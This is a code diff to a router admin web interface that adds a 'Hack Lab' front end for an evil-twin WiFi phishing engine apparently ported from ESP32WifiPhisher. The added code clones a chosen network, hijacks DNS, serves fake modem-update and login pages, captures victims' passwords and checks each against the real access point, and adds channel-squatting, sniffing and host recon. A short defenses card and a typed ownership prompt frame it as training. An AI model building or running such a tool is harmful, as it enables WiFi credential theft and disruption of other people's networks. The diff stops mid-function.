@@ -90,6 +90,13 @@ async function post(path, body) {
   return r.json();
 }
 async function get(path) { return (await fetch(API + path)).json(); }
+// ---- Hack Lab API (PC-side engine, hacklab_api.py on :8101) ----
+const LAB = (new URLSearchParams(location.search).get('lab') || 'http://127.0.0.1:8101').replace(/\/$/, '');
+async function labPost(path, body) {
+  const r = await fetch(LAB + path, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body || {})});
+  return r.json();
+}
+async function labGet(path) { return (await fetch(LAB + path)).json(); }
 
 async function login() {
   $('err').textContent = ''; $('go').disabled = true;
@@ -104,7 +111,7 @@ async function login() {
 }
 $('pw').addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
 
- const TABS = [['status','📊 Status'],['wifi','📶 WiFi'],['net','🌐 Network'],['wan','🌍 Internet'],['dev','👥 Devices'],['mod','🚀 Modern'],['travel','🧭 Travel'],['time','🕐 Time'],['fwd','🚪 Forwarding'],['sec','🛡️ Security'],['twin','⚡ Evil Twin Lab'],['sys','⚙️ System'],['tools','🔧 Tools'],['fw','🧬 Firmware'],['raw','🧰 Blocks']];
+ const TABS = [['status','📊 Status'],['wifi','📶 WiFi'],['net','🌐 Network'],['wan','🌍 Internet'],['dev','👥 Devices'],['mod','🚀 Modern'],['travel','🧭 Travel'],['time','🕐 Time'],['fwd','🚪 Forwarding'],['sec','🛡️ Security'],['twin','🧪 Hack Lab'],['sys','⚙️ System'],['tools','🔧 Tools'],['fw','🧬 Firmware'],['raw','🧰 Blocks']];
 function buildTabs() {
   $('tabs').innerHTML = TABS.map(([id, label], i) =>
     `<div class="tab${i === 0 ? ' active' : ''}" id="tab-${id}" onclick="showTab('${id}')">${label}</div>`).join('');
@@ -318,187 +325,278 @@ async function tabSec() {
     <div class="card"><h3>🚧 Access control (block 31)</h3><div id="acbox">Loading…</div></div>`;
    secExtras();
 }
-async function twinSurvey() {
-  $('twinlist').innerHTML = 'Scanning… (~5 s)';
-  const d = await post('/api/scan', {});
-  if (!d.ok) { $('twinlist').innerHTML = '<span class="bad">Failed.</span>'; return; }
-  window._twinAps = d.aps;
-  twinStatsRender(d.aps);
-  $('twinlist').innerHTML =
-    `<table><thead><tr><th>#</th><th>SSID</th><th>BSSID</th><th>Ch</th><th>Auth</th><th></th></tr></thead><tbody>${
-      d.aps.map((a, i) => `<tr><td>${i}</td><td>${esc(a.ssid) || '<i>hidden</i>'}</td><td>${esc(a.bssid)}</td>
-        <td>${esc(a.channel)}</td><td>${esc(a.auth)}</td>
-        <td><button onclick="twinPick(${i})" style="padding:6px 10px">Select</button></td></tr>`).join('')
-    }</tbody></table>`;
+/* ====== HACK LAB (ESP32WifiPhisher ported to PC + router) ======
+   Engine: hacklab_api.py on :8101. Portal :8080, DNS :5354, WS bridge :8080/ws.
+   Everything below talks to REAL services: router RF, real ARP/mDNS/SSDP,
+   real TCP port scans, real tcpdump sniffer, real WDS-based password verify. */
+let _labWS = null, _labPoll = null, _labPackets = 0;
+function labOpenConsole() { window.open(LAB.replace(':8101', '') + ':' + (window._labPortalPort || 8080) + '/admin.html', 'labconsole'); }
+function labWS() {
+  if (_labWS && _labWS.readyState <= 1) return _labWS;
+  const host = LAB.replace(/^http/, 'ws').replace(/:8101$/, ':8080');
+  _labWS = new WebSocket(host + '/ws');
+  _labWS.onmessage = e => {
+    try {
+      const m = JSON.parse(e.data);
+      if (m.type === 'packet') { _labPackets++; const el = $('lab-sniff-pre'); if (el) el.textContent = `[${m.src} > ${m.dst}] ${m.info}` + '\n' + el.textContent.split('\n').slice(0, 24).join('\n'); }
+      if (m.type === 'log') { const el = $('lab-console-log'); if (el) el.textContent = `[${m.level}] ${m.msg}` + '\n' + el.textContent.split('\n').slice(0, 24).join('\n'); }
+    } catch (err) {}
+  };
+  return _labWS;
 }
-function twinGate() {
-  if (window._twinOk) return true;
-  const t = prompt('Type I OWN THIS NETWORK to unlock the twin builder (your own gear only):');
-  if (t !== 'I OWN THIS NETWORK') { say('twinmsg', 'Builder stays locked.', false); return false; }
-  window._twinOk = true;
+function labSay(id, html, ok) { const el = $(id); if (el) el.innerHTML = `<span class="${ok === false ? 'bad' : ok === true ? 'ok' : 'warn'}">${html}</span>`; }
+async function labStatus() {
+  try {
+    const d = await labGet('/api/lab_status');
+    if (!d.ok) return null;
+    window._labPortalPort = d.status.portal_port;
+    window._labHostIp = d.status.ip;
+    return d;
+  } catch (e) { return null; }
+}
+async function tabTwin() {
+  const me = await get('/api/block?id=33');
+  window._twinOwn = me.ok ? {ssid: me.block.cSsid, key: me.block.cPskSecret, sec: me.block.bSecurityEnable} : {};
+  const st = await labStatus();
+  const live = st && st.status.et_running;
+  $('tabbody').innerHTML =
+    `<div class="card" style="border-color:#a40e26"><h3 style="color:#f85149">🧪 Hack Lab — ESP32WifiPhisher, no ESP32 needed</h3>
+      <p class="note" style="text-align:left">Your <b>router</b> is the radio (broadcasts the twin SSID), your <b>PC</b> is the brain
+      (portal + DNS + recon + sniffer + capture + password verify). Real everywhere: victims get real DHCP, real DNS hijack to this PC,
+      real captive-portal pages from the ESP32WifiPhisher firmware, real TCP/ARP/mDNS/SSDP scanning, and every submitted password is
+      <b>actually verified against the target AP</b> by joining it with your router (WDS probe). Own/authorized networks only.</p>
+      ${row('Lab engine', live ? `<span class="bad">● LIVE</span> — twin "${esc(st.status.ssid || '')}" since ${esc(st.status.uptime)} ago` : 'idle',
+            live ? false : true)}
+      ${row('Portal (captive pages)', live ? `<a href="#" onclick="window.open('http://'+(location.hostname||'${st.status.ip}')+':${st.status.portal_port}/','portal');return false">open portal :${st.status.portal_port}</a> · scheme ${esc(st.status.scheme)} · hits ${st.status.portal_hits}` : 'starts with the lab')}
+      ${row('DNS hijack', live ? `:5354 — victims resolve everything to ${esc(st.status.ip)} (${st.status.dns_queries} queries)` : 'starts with the lab')}
+      ${row('Password verify', live ? (st.status.verify ? 'ON — submitted keys are tested against the real AP' : 'off') : '-', live ? st.status.verify : undefined)}
+      <div class="btnrow">
+        <button onclick="labOpenConsole()">🖥️ Open ESP32 console (original admin.html)</button>
+        <button onclick="labPreviewPortal()">👁️ Preview phishing page</button>
+        <button onclick="tabTwin()">🔄 Refresh</button></div>
+      <div class="msg" id="labmsg"></div></div>
+    <div class="card"><h3>🎯 1 · Target</h3>
+      <div class="btnrow"><button onclick="labScan()">📡 Scan (real airwaves via router)</button></div>
+      <div id="lab-scanlist"><p class="note">Scan to list APs.</p></div></div>
+    <div class="card"><h3>⚙️ 2 · Launch</h3><div id="lab-console"><p class="note">Select a target above.</p></div><div class="msg" id="lab-startmsg"></div></div>
+    <div class="card"><h3>👥 3 · Live victims</h3><div id="lab-victims"><p class="note">Idle.</p></div></div>
+    <div class="card"><h3>🔑 4 · Captured credentials + live verification</h3><div id="lab-creds"><p class="note">None yet.</p></div></div>
+    <div class="card"><h3>🛰️ 5 · Recon suite</h3>
+      <div class="btnrow"><button onclick="labHosts()">🌐 Host discovery (ARP + mDNS + SSDP)</button>
+      <button onclick="labDetectTwins()">🔍 Twin detector</button>
+      <button onclick="labSniff('start')">📉 Start LAN sniffer (tcpdump)</button>
+      <button onclick="labSniff('stop')">⏹ Stop sniffer</button></div>
+      <div id="lab-hosts"><p class="note">Hosts appear here.</p></div>
+      <pre id="lab-sniff-pre" style="display:none"></pre></div>
+    <div class="card"><h3>📡 6 · Aircrack-style verify + pcap</h3>
+      <p class="note" style="text-align:left">The ESP32 checks a candidate password against a captured handshake. Here the router joins the
+      target AP for real (WDS probe) — a successful association <b>proves</b> the key. Download a synthetic radiotap pcap of the session.</p>
+      <div class="kv"><label>Password to test</label><input id="lab-testpw" type="text" placeholder="candidate key"></div>
+      <div class="btnrow"><button onclick="labVerify()">🔓 Verify against target</button>
+      <button onclick="labPcap()">⬇ Download session pcap</button></div>
+      <div class="msg" id="lab-verifymsg"></div></div>
+    <div class="card"><h3>📶 7 · Deauther (router-assisted) + Karma</h3>
+      <p class="note" style="text-align:left">No injectable RF on the PC, so the deauther-equivalent is a <b>channel squat</b>: the router
+      moves onto the target channel and beacon-wars it — clients get bounced to the twin. Karma-equivalent: the OPEN twin lures probe-happy devices automatically.</p>
+      <div class="btnrow"><button onclick="labDeauth('start')">⚡ Start channel squat</button>
+      <button onclick="labDeauth('stop')">⏹ Stop squat</button></div>
+      <div class="msg" id="lab-deauthmsg"></div></div>
+    <div class="card"><h3>🔊 8 · BLE scanner (adapter optional)</h3>
+      <div class="btnrow"><button onclick="labBLE('start')">Start BLE scan</button>
+      <button onclick="labBLE('stop')">Stop</button>
+      <button onclick="labBLE('list')">List devices</button></div>
+      <div id="lab-ble"><p class="note">No BLE devices listed.</p></div></div>
+    <div class="card"><h3>📜 9 · Lab event log</h3><pre id="lab-events">Idle.</pre></div>
+    <div class="card"><h3>🛡️ Defenses (what this lab teaches)</h3>
+      ${row('1. BSSID > SSID', 'Your AP MAC never changes; a twin has a different MAC — compare the scan table.')}
+      ${row('2. The OPEN copy', 'Same name open + secured = textbook twin. Join only the secured one you recognize.')}
+      ${row('3. Auto-join off', 'Phones silently join the loudest known name — the twin counts on it.')}
+      ${row('4. HTTPS + VPN', 'TLS keeps the twin blind; a VPN tunnels through everything it sees.')}
+      ${row('5. Forget old nets', 'Delete hotel/cafe profiles so they cannot be impersonated later.')}
+      ${row('6. WPA3 / Enterprise', 'Per-user creds + SAE kill clone-and-wait attacks.')}</div>`;
+  if (live) {
+    labConsoleBuild(JSON.stringify(st.status.target));
+    labPollStart();
+    labWS();
+  }
+}
+async function labScan() {
+  $('lab-scanlist').innerHTML = 'Scanning the real airwaves (~10 s)…';
+  const d = await post('/api/scan', {});
+  if (!d.ok) { $('lab-scanlist').innerHTML = '<span class="bad">Router scan failed: ' + JSON.stringify(d) + '</span>'; return; }
+  window._labAps = d.aps;
+  $('lab-scanlist').innerHTML =
+    `<table><thead><tr><th>#</th><th>SSID</th><th>BSSID</th><th>Ch</th><th>RSSI</th><th>Auth</th><th></th></tr></thead><tbody>` +
+    d.aps.map((a, i) => `<tr><td>${i}</td><td>${esc(a.ssid) || '<i>hidden</i>'}</td><td>${esc(a.bssid)}</td><td>${esc(a.channel)}</td><td>${esc(a.rssi)}</td><td>${({'0':'Open','1':'WEP','2':'WPA','3':'WPA2','4':'WPA/WPA2','5':'WPA2-Ent','6':'WPA3','7':'WPA2/3'})[String(a.auth)] || esc(a.auth)}</td>
+      <td><button onclick="labPick(${i})" style="padding:6px 10px">Select</button></td></tr>`).join('') +
+    `</tbody></table>`;
+}
+function labGate() {
+  if (window._labOk) return true;
+  const t = prompt('Type I OWN THIS NETWORK to unlock the lab (own/authorized gear only):');
+  if (t !== 'I OWN THIS NETWORK') { labSay('labmsg', 'Lab stays locked.', false); return false; }
+  window._labOk = true;
   return true;
 }
-function twinPick(i) {
-  if (!twinGate()) return;
-  const a = window._twinAps[i];
-  if (!a || !a.ssid) { say('twinmsg', 'Empty row — pick a named network.', false); return; }
-  window._twinTarget = a;
-  twinConsole();
-  say('twinmsg', `Target locked: "${a.ssid}". Console ready below — review, then START.`, true);
-  const c = $('twinconsole');
-  if (c) c.scrollIntoView({block: 'nearest'});
+function labPick(i) {
+  if (!labGate()) return;
+  const a = window._labAps[i];
+  if (!a || !a.ssid) { labSay('lab-startmsg', 'Pick a named network.', false); return; }
+  window._labTarget = a;
+  labConsoleBuild(i);
+  labSay('lab-startmsg', `Target: "${esc(a.ssid)}" (${esc(a.bssid)}, ch ${esc(a.channel)}). Configure and launch below.`, true);
+  const c = $('lab-console'); if (c) c.scrollIntoView({block: 'nearest'});
 }
-async function twinMacs() {
-  const s = new Set();
+function labConsoleBuild(sel) {
+  const t = window._labTarget || {};
+  $('lab-console').innerHTML =
+    `<div class="kv"><label>Target</label><input id="lb-ssid" value="${esc(t.ssid || '')}" readonly></div>
+     <div class="kv"><label>Channel</label><input id="lb-ch" value="${esc(t.channel || '')}" readonly></div>
+     <div class="kv"><label>Phishing scheme</label><select id="lb-portal">
+       <option value="fwupgrade">ISP "Modem Update" (fwupgrade)</option>
+       <option value="netmng">macOS/Windows WiFi prompt (netmng)</option>
+       <option value="oauth">Social/OAuth login (oauth)</option>
+       <option value="admin">ESP32 admin console (admin)</option></select></div>
+     <div class="kv"><label>Verify submitted passwords</label><select id="lb-verify">
+       <option value="1" selected>ON — test each key against the real AP (WDS)</option>
+       <option value="0">OFF — capture only</option></select></div>
+     <div class="btnrow"><button onclick="labStart()" style="background:#a40e26">🔴 LAUNCH TWIN + PORTAL</button>
+     ${window._labLive ? '<button onclick="labStop()" style="background:#9e6a03">■ STOP lab</button>' : ''}</div>
+     <p class="note">Victim flow: join twin → real DHCP → all DNS answers "this PC" → captive probe 302 → phishing page →
+     submitted password captured → router joins the REAL AP with it (WDS) → wdsstatus 5 = key correct → alert in this panel.</p>`;
+}
+async function labStart() {
+  const t = window._labTarget;
+  if (!t || !t.ssid) { labSay('lab-startmsg', 'Select a target first.', false); return; }
+  const portal = $('lb-portal').value, verify = $('lb-verify').value === '1';
+  if (!confirm(`Go LIVE? Twin "${t.ssid}" will broadcast from YOUR router, DNS hijack on, portal serving ${portal}.`)) return;
+  labSay('lab-startmsg', 'Launching…');
+  const d = await labPost('/api/lab_start', {target: {ssid: t.ssid, bssid: (t.bssid || '').replace(/:/g, '-'), channel: t.channel, auth: t.auth}, portal, verify});
+  labSay('lab-startmsg', d.ok ? `🔴 LIVE — ${esc(d.message || '')} Portal: <a href="#" onclick="window.open('${d.url}','portal');return false">open</a>` : 'Failed: ' + JSON.stringify(d), d.ok);
+  if (d.ok) { window._labLive = true; labConsoleBuild(0); labPollStart(); labWS(); }
+}
+async function labStop() {
+  if (!confirm('STOP the lab and restore your router config?')) return;
+  const d = await labPost('/api/lab_stop', {});
+  labSay('lab-startmsg', d.ok ? 'Lab stopped, network restored.' : 'Stop failed: ' + JSON.stringify(d), d.ok);
+  window._labLive = false;
+  labPollStop();
+  setTimeout(tabTwin, 800);
+}
+function labPollStart() {
+  labPollStop();
+  _labPoll = setInterval(async () => {
+    const st = await labStatus();
+    if (!st || !st.status.et_running) return;
+    const v = $('lab-victims');
+    if (v) v.innerHTML = (st.status.joins || []).length ?
+      `<table><thead><tr><th>Time</th><th>Event</th><th>Name</th><th>IP</th><th>MAC</th></tr></thead><tbody>` +
+      st.status.joins.map(j => `<tr><td>${esc(j.ts)}</td><td>${j.event === 'join' ? '<span class="bad">➜ joined</span>' : '<span class="info">← left</span>'}</td><td>${esc(j.name)}</td><td>${esc(j.ip)}</td><td>${esc(j.mac)}</td></tr>`).join('') +
+      `</tbody></table><p class="note">DHCP leases + stations via router · ${st.status.n_clients} visible now.</p>`
+      : '<p class="note">Live, no joins yet. Join the twin SSID from a test device.</p>';
+    const c = $('lab-creds');
+    if (c) c.innerHTML = (st.status.creds || []).length ?
+      `<table><thead><tr><th>Time</th><th>From</th><th>Password</th><th>Verify</th></tr></thead><tbody>` +
+      st.status.creds.map(cr => `<tr><td>${esc(cr.ts)}</td><td>${esc(cr.mac || 'portal')}</td><td style="color:#f85149">${esc(cr.password)}</td><td>${st.status.verify_last && st.status.verify_last.password === cr.password ? (st.status.verify_last.ok ? '<span class="ok">✅ CORRECT — logged in</span>' : '<span class="warn">❌ wrong</span>') : '—'}</td></tr>`).join('') +
+      `</tbody></table>` + (st.status.verify_last ? `<p class="note">Last verify: ${st.status.verify_last.ok === true ? '<span class="ok">✅ password works on the real AP</span>' : st.status.verify_last.ok === false ? '<span class="warn">❌ rejected by the real AP</span>' : 'pending'} <span style="color:#6e7681">${esc(st.status.verify_last.detail || '')}</span></p>` : '')
+      : '<p class="note">No credentials captured yet.</p>';
+    const ev = $('lab-events');
+    if (ev && (st.status.events || []).length) ev.textContent = st.status.events.map(e => `${e.ts ? new Date(e.ts * 1000).toLocaleTimeString() : ''} [${e.level}] ${e.msg}`).join('\n');
+  }, 4000);
+}
+function labPollStop() { if (_labPoll) { clearInterval(_labPoll); _labPoll = null; } }
+async function labHosts() {
+  $('lab-hosts').innerHTML = 'ARP sweep + mDNS + SSDP… (~15 s)';
   try {
-    const [l, st] = await Promise.all([get('/api/block?id=9'), get('/api/block?id=13')]);
-    if (l.ok) (l.block.list || []).forEach(e => { if (e.mac && e.ip && e.ip !== '0.0.0.0') s.add(String(e.mac).toUpperCase()); });
-    if (st.ok) (st.block.list || []).forEach(e => { if (e.mac && e.mac !== '00-00-00-00-00-00') s.add(String(e.mac).toUpperCase()); });
-  } catch (e) {}
-  return s;
+    const d = await labPost('/api/hosts', {mdns: true, ssdp: true});
+    $('lab-hosts').innerHTML = !d.ok ? '<span class="bad">Failed.</span>' :
+      (d.hosts.length ? `<table><thead><tr><th>IP</th><th>MAC</th><th>Vendor</th><th>Name</th><th>Found by</th></tr></thead><tbody>` +
+        d.hosts.map(h => `<tr><td>${esc(h.ip)}</td><td>${esc(h.mac || '?')}</td><td>${esc(h.vendor || '?')}</td><td>${esc(h.friendly_name || h.hostname || '?')}</td><td>${esc((h.services || []).map(s => s.source).join(',') || 'arp')}</td></tr>`).join('') +
+        `</tbody></table>` : '<p class="note">No hosts answered the sweep.</p>');
+  } catch (e) { $('lab-hosts').innerHTML = '<span class="bad">Engine error: ' + esc(e.message) + '</span>'; }
 }
-async function twinStart() {
-  if (!twinGate()) return;
-  const t = window._twinTarget;
-  if (!t || !t.ssid) { say('twinmsg', 'Select a target first.', false); return; }
-  const ssid = $('tw-ssid').value.trim();
-  const sec = $('tw-sec').value, key = $('tw-key').value;
-  const matchCh = $('tw-ch').value === '1';
-  const relay = $('tw-relay').value, upkey = $('tw-upkey').value;
-  const dns1 = $('tw-d1').value.trim(), dns2 = $('tw-d2').value.trim();
-  if (!ssid) { say('twinmsg', 'SSID empty.', false); return; }
-  if (sec === '1' && (key.length < 8 || key.length > 63)) { say('twinmsg', 'Twin WPA2 key must be 8–63 chars.', false); return; }
-  if (relay === 'wds' && String(t.auth) !== '0' && (upkey.length < 8 || upkey.length > 63)) { say('twinmsg', 'WDS relay to a secured upstream needs its REAL key — only ever your own network.', false); return; }
-  if (!confirm(`Go LIVE impersonating "${ssid}"? Your WiFi drops for seconds; your devices may roam to the twin — that IS the lesson. STOP restores everything.`)) return;
-  say('twinmsg', 'Snapshotting your settings…');
-  const [b33, b32, b8] = await Promise.all([get('/api/block?id=33'), get('/api/block?id=32'), get('/api/block?id=8')]);
-  if (!b33.ok || !b32.ok || !b8.ok) { say('twinmsg', 'Snapshot failed — aborting safely, nothing changed.', false); return; }
-  window._twinSnap = {w33: b33.block, channel: b32.block.uChannel,
-    dhcp: {enable: b8.block.enable, gateway: b8.block.gateway,
-      dns0: (b8.block.dns || [])[0] || '0.0.0.0', dns1: (b8.block.dns || [])[1] || '0.0.0.0'}};
-  say('twinmsg', 'Broadcasting the twin…');
-  const d = await post('/api/write_fields', {id: 33, fields: {
-    cSsid: ssid, bSecurityEnable: sec,
-    cPskSecret: sec === '1' ? key : (window._twinOwn.key || ''),
-    bBcastSsid: '1', bEnable: '1'}});
-  if (!d.ok) { say('twinmsg', 'Radio write failed: ' + JSON.stringify(d), false); window._twinSnap = null; return; }
-  const twinCh = (matchCh && t.channel && String(t.channel) !== '0') ? String(t.channel) : '';
-  if (twinCh) await post('/api/write_fields', {id: 32, fields: {uChannel: twinCh}});
-  await post('/api/write_fields', {id: 8, fields: {enable: '1',
-    gateway: window._twinSnap.dhcp.gateway, 'dns.0': dns1 || '0.0.0.0', 'dns.1': dns2 || '0.0.0.0'}});
-  let relayMsg = 'Victims share your router internet (NAT) — they really browse.';
-  if (relay === 'wds') {
-    const w = await post('/api/wds', {op: 'connect', ssid: t.ssid, bssid: t.bssid, key: upkey});
-    relayMsg = w.ok ? 'WDS relay requested — check 🧭 Travel for link state (most home routers refuse; NAT still carries victims).'
-      : 'WDS refused by upstream (normal) — victims still ride your NAT internet.';
-  } else if (relay === 'off') relayMsg = 'Isolated lab — victims join but get no internet.';
-  try { localStorage.setItem('twinSnap', JSON.stringify({twinSsid: ssid, twinSec: sec, relay, twinCh: twinCh || 'auto', ts: Date.now()})); } catch (e) {}
-  const base = await twinMacs();
-  window._twinLive = {ssid, sec, relay, channel: twinCh || 'auto', since: Date.now(), seen: base, joins: []};
-  twinPollStart();
-  twinConsole();
-  say('twinmsg', `🔴 TWIN LIVE as "${esc(ssid)}". ${relayMsg} Watch Step 3 for joins.`, true);
-}
-async function twinStop() {
-  const live = window._twinLive;
-  if (!live) return;
-  if (!confirm('STOP the twin and restore your network? Devices drop briefly, then rejoin your real SSID.')) return;
-  say('twinmsg', 'Restoring…');
-  twinPollStop();
-  await post('/api/wds', {op: 'disconnect'});
-  const s = window._twinSnap || {}, w33 = s.w33 || {}, dh = s.dhcp || {};
-  const f33 = {bBcastSsid: w33.bBcastSsid || '1', bEnable: w33.bEnable || '1'};
-  if (w33.cSsid !== undefined) f33.cSsid = w33.cSsid;
-  if (w33.bSecurityEnable !== undefined) f33.bSecurityEnable = w33.bSecurityEnable;
-  let keyNote = '';
-  if (w33.cPskSecret !== undefined) f33.cPskSecret = w33.cPskSecret;
-  else if (live.orphan) keyNote = ' Page was reloaded mid-lab, so the WiFi key could not be restored — retype it in 📶 WiFi.';
-  await post('/api/write_fields', {id: 33, fields: f33});
-  if (s.channel !== undefined) await post('/api/write_fields', {id: 32, fields: {uChannel: s.channel}});
-  if (dh.enable !== undefined) await post('/api/write_fields', {id: 8, fields: {enable: dh.enable,
-    gateway: dh.gateway || '0.0.0.0', 'dns.0': dh.dns0 || '0.0.0.0', 'dns.1': dh.dns1 || '0.0.0.0'}});
-  try { localStorage.removeItem('twinSnap'); } catch (e) {}
-  window._twinLive = null; window._twinSnap = null;
-  const vb = $('twinvictims');
-  if (vb) vb.innerHTML = '<p class="note">Lab ended — network restored.' + keyNote + '</p>';
-  twinConsole();
-  say('twinmsg', 'Your network is back.' + keyNote, true);
-}
-function twinPollStart() {
-  twinPollStop();
-  twinVictims();
-  window._twinTimer = setInterval(() => {
-    if (!window._twinLive) return twinPollStop();
-    if ($('twinvictims')) twinVictims();
-  }, 5000);
-}
-function twinPollStop() {
-  if (window._twinTimer) { clearInterval(window._twinTimer); window._twinTimer = null; }
-}
-async function twinVictims() {
-  const box = $('twinvictims');
-  const live = window._twinLive;
-  if (!box || !live) return;
-  let leases = [], sta = [];
-  try {
-    const [l, st] = await Promise.all([get('/api/block?id=9'), get('/api/block?id=13')]);
-    if (l.ok) leases = (l.block.list || []).filter(e => e.mac && e.ip && e.ip !== '0.0.0.0');
-    if (st.ok) sta = (st.block.list || []).filter(e => e.mac && e.mac !== '00-00-00-00-00-00');
-  } catch (e) { box.innerHTML = '<span class="bad">Poll failed — will retry.</span>'; return; }
-  const byMac = {};
-  sta.forEach(e => { byMac[String(e.mac).toUpperCase()] = e; });
-  const now = new Date().toLocaleTimeString();
-  leases.forEach(e => {
-    const m = String(e.mac).toUpperCase();
-    if (!live.seen.has(m)) { live.seen.add(m);
-      live.joins.unshift({mac: e.mac, ip: e.ip, name: e.hostName || (byMac[m] || {}).name || '(unnamed)', at: now}); }
-  });
-  sta.forEach(e => {
-    const m = String(e.mac).toUpperCase();
-    if (e.online === '1' && !live.seen.has(m)) { live.seen.add(m);
-      live.joins.unshift({mac: e.mac, ip: e.ip || '?', name: e.name || '(unnamed)', at: now}); }
-  });
-  const pill = $('twinpill');
-  if (pill) pill.innerHTML = `<span class="bad">● LIVE — ${live.joins.length} joined</span>`;
-  box.innerHTML = live.joins.length ?
-    `<table><thead><tr><th>Joined</th><th>Name</th><th>IP (via twin DHCP)</th><th>MAC</th></tr></thead><tbody>` +
-    live.joins.map(j => `<tr><td>${esc(j.at)}</td><td>${esc(j.name)}</td><td>${esc(j.ip)}</td><td>${esc(j.mac)}</td></tr>`).join('') +
-    `</tbody></table><p class="note">While the twin is live your original SSID does not exist — every wireless join above came through the twin. Wired devices were baselined out at START.</p>`
-    : '<p class="note">Twin live, no joins yet — join it from a test device and watch this space.</p>';
-}
-async function twinDetect() {
-  $('twinlist').innerHTML = 'Scanning… (~5 s)';
+async function labDetectTwins() {
+  $('lab-hosts').innerHTML = 'Scanning…';
   const d = await post('/api/scan', {});
-  if (!d.ok) { $('twinlist').innerHTML = '<span class="bad">Failed.</span>'; return; }
+  if (!d.ok) { $('lab-hosts').innerHTML = '<span class="bad">Scan failed.</span>'; return; }
   const own = (window._twinOwn && window._twinOwn.ssid) || '';
   const groups = {};
   d.aps.forEach(a => { const k = (a.ssid || '').toLowerCase(); (groups[k] = groups[k] || []).push(a); });
-  let html = `<table><thead><tr><th>Verdict</th><th>SSID</th><th>BSSIDs seen</th><th>Detail</th></tr></thead><tbody>`;
-  let issue = 0;
+  let issues = 0, html = '<table><thead><tr><th>Verdict</th><th>SSID</th><th>BSSIDs</th></tr></thead><tbody>';
   for (const k of Object.keys(groups)) {
+    if (!k) continue;
     const g = groups[k], macs = [...new Set(g.map(a => a.bssid))];
     const auths = [...new Set(g.map(a => String(a.auth)))];
-    const name = g[0].ssid || '(hidden)';
-    if (k === '' ) continue;
-    if (macs.length > 1) {
-      const isMe = own && k === own.toLowerCase();
-      issue++;
-      html += `<tr><td>${isMe ? '<span class="bad">⚠️ CLONE OF YOU?</span>' : '<span class="warn">⚠️ shared name</span>'}</td><td>${esc(name)}</td><td>${macs.map(esc).join('<br>')}</td><td>${isMe ? 'Your SSID from ' + macs.length + ' radios — you run one AP. Unknown ones = someone impersonating you (or your own extender — check MACs).' : 'Same name, several radios: legit mesh/extender OR a twin. An OPEN copy next to a secured one is the classic tell — compare auth below.'}</td></tr>`;
-    }
+    if (macs.length > 1) { issues++; html += `<tr><td>${k === own.toLowerCase() ? '<span class="bad">⚠️ CLONE OF YOU</span>' : '<span class="warn">shared name</span>'}</td><td>${esc(g[0].ssid)}</td><td>${macs.map(esc).join('<br>')}</td></tr>`; }
+    if (auths.includes('0') && auths.some(a => a !== '0')) { issues++; html += `<tr><td><span class="bad">🎯 OPEN COPY</span></td><td>${esc(g[0].ssid)}</td><td>${macs.map(esc).join('<br>')}</td></tr>`; }
   }
-  // open-copy-of-secured check: same name seen both open and secured
-  for (const k of Object.keys(groups)) {
-    const g = groups[k], auths = [...new Set(g.map(a => String(a.auth)))];
-    if (k !== '' && auths.includes('0') && auths.some(a => a !== '0')) {
-      issue++;
-      html += `<tr><td><span class="bad">🎯 OPEN COPY</span></td><td>${esc(g[0].ssid)}</td><td>${[...new Set(g.map(a => a.bssid))].map(esc).join('<br>')}</td><td>Same name seen OPEN and secured — textbook evil-twin pattern. Join only the secured one you recognize.</td></tr>`;
-    }
-  }
-  const opens = d.aps.filter(a => String(a.auth) === '0' && a.ssid);
-  html += `</tbody></table><p class="note">Open networks nearby: ${opens.length} (${opens.slice(0, 6).map(a => esc(a.ssid)).join(', ') || 'none'}). ` +
-    (issue === 0 ? 'No duplicate-SSID radios found — air looks clean ✅' : issue + ' SSID(s) need your eyes above.') + ` Your SSID: <b>${esc(own || '?')}</b>.</p>`;
-  $('twinlist').innerHTML = html;
+  $('lab-hosts').innerHTML = html + `</tbody></table><p class="note">${issues ? issues + ' finding(s).' : 'Air looks clean ✅'} Your SSID: <b>${esc(own || '?')}</b>.</p>`;
 }
+async function labSniff(op) {
+  const d = await labPost('/api/sniffer', {op, iface: 'enp2s0'});
+  const pre = $('lab-sniff-pre');
+  if (op === 'start') {
+    if (d.ok) { pre.style.display = 'block'; pre.textContent = 'sniffing enp2s0 — packets stream here…'; labWS(); labSay('labmsg', 'Sniffer live (needs root for full fidelity; unprivileged sees your own traffic).', true); }
+    else labSay('labmsg', 'tcpdump failed — run the lab backend with sudo for raw capture.', false);
+  } else { pre.style.display = 'none'; labSay('labmsg', 'Sniffer stopped.', true); }
+}
+async function labVerify() {
+  const pw = $('lab-testpw').value;
+  if (!pw) { labSay('lab-verifymsg', 'Type a candidate password.', false); return; }
+  labSay('lab-verifymsg', 'Router is joining the real AP with that key… (~15 s)');
+  const d = await labPost('/api/verify', {password: pw});
+  labSay('lab-verifymsg', d.ok ? (d.correct ? '✅ <b>CORRECT</b> — the router associated with the real AP (' + esc(d.detail) + ')' : '❌ wrong — association refused (' + esc(d.detail) + ')') : 'Failed: ' + JSON.stringify(d), d.correct);
+}
+async function labPcap() {
+  const t = window._labTarget || {};
+  const rid = 42;
+  labSay('lab-verifymsg', 'Building pcap…');
+  try {
+    const ws = labWS();
+    const onMsg = e => {
+      try {
+        const m = JSON.parse(e.data);
+        if (m.type === 'pcap_file') {
+          ws.removeEventListener('message', onMsg);
+          const bin = atob(m.payload);
+          const u8 = new Uint8Array(bin.length);
+          for (let i = 0; i < bin.length; i++) u8[i] = bin.charCodeAt(i);
+          const blob = new Blob([u8], {type: 'application/vnd.tcpdump.pcap'});
+          const a = document.createElement('a');
+          a.href = URL.createObjectURL(blob); a.download = m.filename; a.click();
+          labSay('lab-verifymsg', '⬇ ' + esc(m.filename) + ' downloaded (radiotap, wireshark-ready).', true);
+        }
+      } catch (err) {}
+    };
+    ws.addEventListener('message', onMsg);
+    ws.send(JSON.stringify({cmd: 20, req_id: rid, bssid: t.bssid || ''}));
+    setTimeout(() => ws.removeEventListener('message', onMsg), 9000);
+  } catch (e) { labSay('lab-verifymsg', 'pcap failed: ' + esc(e), false); }
+}
+async function labDeauth(op) {
+  labSay('lab-deauthmsg', 'Working…');
+  const d = await labPost('/api/deauth', {op, channel: (window._labTarget || {}).channel});
+  labSay('lab-deauthmsg', d.ok ? esc(d.message) : 'Failed: ' + JSON.stringify(d), d.ok);
+}
+async function labBLE(op) {
+  const d = await labPost('/api/ble', {op});
+  if (op === 'list' || (d.devices)) {
+    const devs = d.devices || [];
+    $('lab-ble').innerHTML = devs.length ?
